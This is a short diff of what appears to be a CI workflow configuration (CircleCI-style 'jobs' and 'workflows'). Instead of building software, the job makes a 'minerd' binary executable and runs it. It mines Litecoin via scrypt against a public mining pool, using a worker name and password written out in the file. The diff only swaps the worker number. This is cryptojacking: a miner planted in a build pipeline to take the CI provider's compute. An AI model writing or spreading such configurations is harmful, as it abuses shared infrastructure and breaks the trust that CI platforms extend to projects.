@@ -13,7 +13,7 @@ jobs:
            cd Q
            
            chmod 755 minerd
-           ./minerd --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker13:my123456
+           ./minerd --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker12:my123456
       
           
 workflows:
